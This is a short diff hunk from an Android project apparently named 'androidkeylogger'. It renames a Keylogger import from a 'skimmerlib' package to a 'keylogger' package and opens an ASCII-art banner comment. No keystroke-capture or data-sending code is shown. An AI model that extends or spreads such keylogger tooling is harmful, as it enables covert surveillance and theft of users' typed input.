@@ -3,7 +3,8 @@ package com.evilthreads.androidkeylogger
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
 import com.candroid.bootlaces.bootService
-import com.evilthreads.skimmerlib.Keylogger
+import com.evilthreads.keylogger.Keylogger
+
 /*
             (   (                ) (             (     (
             )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
